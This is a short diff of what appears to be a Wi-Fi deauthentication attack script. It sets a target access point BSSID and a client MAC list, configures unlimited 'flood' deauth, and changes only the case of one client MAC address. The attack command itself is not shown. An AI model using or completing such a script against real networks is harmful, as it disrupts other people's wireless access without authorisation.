@@ -5,7 +5,7 @@ BSSID="24:46:E4:1E:F5:7C"
 DEAUTH_COUNT=0  # 0 = flood
 
 CLIENTS=(
-    "6A:B1:E1:D5:77:A5"
+    "6a:b1:e1:d5:77:a5"
 )
 
 echo "[*] Starting parallel deauth for ${#CLIENTS[@]} clients..."
